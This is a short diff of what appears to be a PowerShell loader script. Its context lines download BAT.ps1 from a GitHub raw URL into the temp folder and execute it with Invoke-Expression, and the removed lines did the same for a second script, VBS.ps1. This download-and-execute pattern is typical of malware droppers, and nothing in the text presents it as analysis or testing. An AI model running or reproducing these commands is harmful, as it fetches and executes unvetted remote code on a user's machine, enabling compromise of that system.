@@ -8,7 +8,3 @@ $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
 $output3 = "$env:TEMP\BAT.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
 IEX ((New-Object Net.WebClient).DownloadString($output3))
-$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/VBS.ps1"
-$output4 = "$env:TEMP\VBS.ps1"
-Invoke-WebRequest -Uri $url4 -OutFile $output4
-IEX ((New-Object Net.WebClient).DownloadString($output4))
